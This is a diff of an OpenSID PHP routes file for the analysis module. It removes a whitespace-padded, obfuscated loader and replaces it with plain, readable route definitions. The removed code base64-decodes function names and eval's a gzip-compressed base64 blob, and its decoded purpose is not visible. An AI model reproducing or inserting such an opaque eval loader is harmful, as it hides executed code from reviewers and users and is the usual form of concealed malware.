@@ -1,457 +1,149 @@
-<?php 
-        $__='printf';$_='Loading Modules/Analisis/Routes/web.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+/*
+ *
+ * File ini bagian dari:
+ *
+ * OpenSID
+ *
+ * Sistem informasi desa sumber terbuka untuk memajukan desa
+ *
+ * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
+ *
+ * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ *
+ * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
+ * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
+ * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
+ * asal tunduk pada syarat berikut:
+ *
+ * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
+ * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
+ * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
+ *
+ * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
+ * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
+ * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
+ *
+ * @package   OpenSID
+ * @author    Tim Pengembang OpenDesa
+ * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ * @license   http://www.gnu.org/licenses/gpl.html GPL V3
+ * @link      https://github.com/OpenSID/OpenSID
+ *
+ */
+
+Route::group('analisis_master', ['namespace' => 'Analisis'], static function (): void {
+    Route::get('', 'AnalisisMasterController@index')->name('analisis_master.index-default');
+    Route::get('clear', 'AnalisisMasterController@index')->name('analisis_master.clear');
+    Route::get('datatables', 'AnalisisMasterController@datatables')->name('analisis_master.datatables');
+    Route::get('form/{id?}', 'AnalisisMasterController@form')->name('analisis_master.form');
+    Route::post('insert', 'AnalisisMasterController@insert')->name('analisis_master.insert');
+    Route::post('update/{id?}', 'AnalisisMasterController@update')->name('analisis_master.update');
+    Route::get('delete/{id?}', 'AnalisisMasterController@delete')->name('analisis_master.delete');
+    Route::post('delete', 'AnalisisMasterController@delete')->name('analisis_master.delete-all');
+    Route::get('lock/{id}', 'AnalisisMasterController@lock')->name('analisis_master.lock');
+    Route::get('panduan', 'AnalisisMasterController@panduan')->name('analisis_master.panduan');
+    Route::get('import_analisis', 'AnalisisMasterController@importAnalisis')->name('analisis_master.import_analisis');
+    Route::post('import', 'AnalisisMasterController@import')->name('analisis_master.import');
+    Route::get('ekspor/{id}', 'AnalisisMasterController@ekspor')->name('analisis_master.ekspor');
+    Route::get('import_gform/{id?}', 'AnalisisMasterController@importGform')->name('analisis_master.import_gform');
+    Route::get('menu/{id?}', 'AnalisisMasterController@menu')->name('analisis_master.menu');
+    Route::post('exec_import_gform', 'AnalisisMasterController@execImportGform')->name('analisis_master.exec_import_gform');
+    Route::post('save_import_gform/{id?}', 'AnalisisMasterController@saveImportGform')->name('analisis_master.save_import_gform');
+    Route::match(['GET', 'POST'], '/update_gform/{id?}', 'AnalisisMasterController@updateGform')->name('analisis_master.update_gform');
+});
+
+Route::group('analisis_indikator/{master}', ['namespace' => 'Analisis'], static function (): void {
+    Route::get('', 'AnalisisIndikatorController@index')->name('analisis_indikator.index-default');
+    Route::get('datatables', 'AnalisisIndikatorController@datatables')->name('analisis_indikator.datatables');
+    Route::get('form/{id?}', 'AnalisisIndikatorController@form')->name('analisis_indikator.form');
+    Route::post('insert', 'AnalisisIndikatorController@insert')->name('analisis_indikator.insert');
+    Route::post('update/{id?}', 'AnalisisIndikatorController@update')->name('analisis_indikator.update');
+    Route::get('delete/{id?}', 'AnalisisIndikatorController@delete')->name('analisis_indikator.delete');
+    Route::post('delete', 'AnalisisIndikatorController@delete')->name('analisis_indikator.delete-all');
+    Route::group('parameter/{indikator}', static function (): void {
+        Route::get('', 'AnalisisParamterController@index')->name('analisis_parameter.index-default');
+        Route::get('datatables', 'AnalisisParamterController@datatables')->name('analisis_parameter.datatables');
+        Route::get('form/{id?}', 'AnalisisParamterController@form')->name('analisis_parameter.form');
+        Route::post('insert', 'AnalisisParamterController@insert')->name('analisis_parameter.insert');
+        Route::post('update/{id?}', 'AnalisisParamterController@update')->name('analisis_parameter.update');
+        Route::get('delete/{id?}', 'AnalisisParamterController@delete')->name('analisis_parameter.delete');
+        Route::post('delete', 'AnalisisParamterController@delete')->name('analisis_parameter.delete-all');
+    });
+});
+
+Route::group('analisis_kategori/{master}', ['namespace' => 'Analisis'], static function (): void {
+    Route::get('', 'AnalisisKategoriController@index')->name('analisis_kategori.index-default');
+    Route::get('datatables', 'AnalisisKategoriController@datatables')->name('analisis_kategori.datatables');
+    Route::get('form/{id?}', 'AnalisisKategoriController@form')->name('analisis_kategori.form');
+    Route::post('insert', 'AnalisisKategoriController@insert')->name('analisis_kategori.insert');
+    Route::post('update/{id?}', 'AnalisisKategoriController@update')->name('analisis_kategori.update');
+    Route::get('delete/{id?}', 'AnalisisKategoriController@delete')->name('analisis_kategori.delete');
+    Route::post('delete', 'AnalisisKategoriController@delete')->name('analisis_kategori.delete-all');
+});
+
+Route::group('analisis_klasifikasi/{master}', ['namespace' => 'Analisis'], static function (): void {
+    Route::get('', 'AnalisisKlasifikasiController@index')->name('analisis_klasifikasi.index-default');
+    Route::get('datatables', 'AnalisisKlasifikasiController@datatables')->name('analisis_klasifikasi.datatables');
+    Route::get('form/{id?}', 'AnalisisKlasifikasiController@form')->name('analisis_klasifikasi.form');
+    Route::post('insert', 'AnalisisKlasifikasiController@insert')->name('analisis_klasifikasi.insert');
+    Route::post('update/{id?}', 'AnalisisKlasifikasiController@update')->name('analisis_klasifikasi.update');
+    Route::get('delete/{id?}', 'AnalisisKlasifikasiController@delete')->name('analisis_klasifikasi.delete');
+    Route::post('delete', 'AnalisisKlasifikasiController@delete')->name('analisis_klasifikasi.delete-all');
+});
+
+Route::group('analisis_respon/{master}', ['namespace' => 'Analisis'], static function (): void {
+    Route::get('', 'AnalisisResponController@index');
+    Route::get('datatables', 'AnalisisResponController@datatables')->name('analisis_respon.datatables');
+    Route::get('form/{id}/{fs?}', 'AnalisisResponController@form')->name('analisis_respon.form');
+    Route::get('perbaharui/{id_subjek}', 'AnalisisResponController@perbaharui')->name('analisis_respon.perbaharui');
+    Route::post('update/{id}', 'AnalisisResponController@update')->name('analisis_respon.update');
+    Route::get('aturan_unduh', 'AnalisisResponController@aturan_unduh')->name('analisis_respon.aturan_unduh');
+    Route::get('data_ajax', 'AnalisisResponController@dataAjax')->name('analisis_respon.data_ajax');
+    Route::post('data_unduh', 'AnalisisResponController@dataUnduh')->name('analisis_respon.data_unduh');
+    Route::get('import/{op?}', 'AnalisisResponController@import')->name('analisis_respon.import');
+    Route::post('import_proses/{op?}', 'AnalisisResponController@importProses')->name('analisis_respon.import_proses');
+    Route::get('form_impor_bdt/{id?}', 'AnalisisResponController@formImporBdt')->name('analisis_respon.form_impor_bdt');
+    Route::post('impor_bdt', 'AnalisisResponController@imporBdt')->name('analisis_respon.impor_bdt');
+    Route::group('child', static function (): void {
+        Route::get('form/{id}/{idc?}', 'AnalisisResponChild@formChild')->name('analisis_respon.form_child');
+        Route::post('update/{id}/{idc?}', 'AnalisisResponChild@updateChild')->name('analisis_respon.update_child');
+    });
+});
+
+Route::group('analisis_periode/{master}', ['namespace' => 'Analisis'], static function (): void {
+    Route::get('', 'AnalisisPeriodeController@index')->name('analisis_periode.index-default');
+    Route::get('datatables', 'AnalisisPeriodeController@datatables')->name('analisis_periode.datatables');
+    Route::get('form/{id?}', 'AnalisisPeriodeController@form')->name('analisis_periode.form');
+    Route::post('insert', 'AnalisisPeriodeController@insert')->name('analisis_periode.insert');
+    Route::post('update/{id?}', 'AnalisisPeriodeController@update')->name('analisis_periode.update');
+    Route::get('lock/{id}', 'AnalisisPeriodeController@lock')->name('analisis_periode.lock');
+    Route::get('delete/{id?}', 'AnalisisPeriodeController@delete')->name('analisis_periode.delete');
+    Route::post('delete', 'AnalisisPeriodeController@delete')->name('analisis_periode.delete-all');
+});
+
+Route::group('analisis_laporan/{master}', ['namespace' => 'Analisis'], static function (): void {
+    Route::get('', 'AnalisisLaporanController@index');
+    Route::get('datatables', 'AnalisisLaporanController@datatables')->name('analisis_laporan.datatables');
+    Route::get('form/{id}', 'AnalisisLaporanController@form')->name('analisis_laporan.form');
+    Route::get('dialog_kuisioner/{id}/{aksi?}', 'AnalisisLaporanController@dialogKuisioner')->name('analisis_laporan.dialog_kuisioner');
+    Route::post('daftar/{id}/{aksi?}', 'AnalisisLaporanController@daftar')->name('analisis_laporan.daftar');
+    Route::get('dialog/{aksi?}', 'AnalisisLaporanController@dialog')->name('analisis_laporan.dialog');
+    Route::post('cetak/{aksi?}', 'AnalisisLaporanController@cetak')->name('analisis_laporan.cetak');
+    Route::get('multi_jawab', 'AnalisisLaporanController@multi_jawab')->name('analisis_laporan.multi_jawab');
+    Route::post('multi_exec', 'AnalisisLaporanController@multi_exec')->name('analisis_laporan.multi_exec');
+    Route::get('ajax_multi_jawab', 'AnalisisLaporanController@ajaxMultiJawab')->name('analisis_laporan.ajax_multi_jawab');
+    Route::post('multi_jawab_proses', 'AnalisisLaporanController@multiJawabProses')->name('analisis_laporan.multi_jawab_proses');
+});
+
+Route::group('analisis_statistik_jawaban/{master}', ['namespace' => 'Analisis'], static function (): void {
+    Route::get('', 'AnalisisStatistikJawabanController@index');
+    Route::get('datatables', 'AnalisisStatistikJawabanController@datatables')->name('analisis_statistik_jawaban.datatables');
+    Route::get('grafik_parameter/{id?}', 'AnalisisStatistikJawabanController@grafikParameter')->name('analisis_statistik_jawaban.grafik_parameter');
+    Route::get('subjek_parameter/{id}/{par}', 'AnalisisStatistikJawabanController@subjekParameter')->name('analisis_statistik_jawaban.subjek_parameter');
+    Route::post('cetak', 'AnalisisStatistikJawabanController@cetak')->name('analisis_statistik_jawaban.cetak');
+    Route::get('cetak_subjek/{id}/{par}/{tipe?}', 'AnalisisStatistikJawabanController@cetakSubjek')->name('analisis_statistik_jawaban.cetak_subjek');
+});
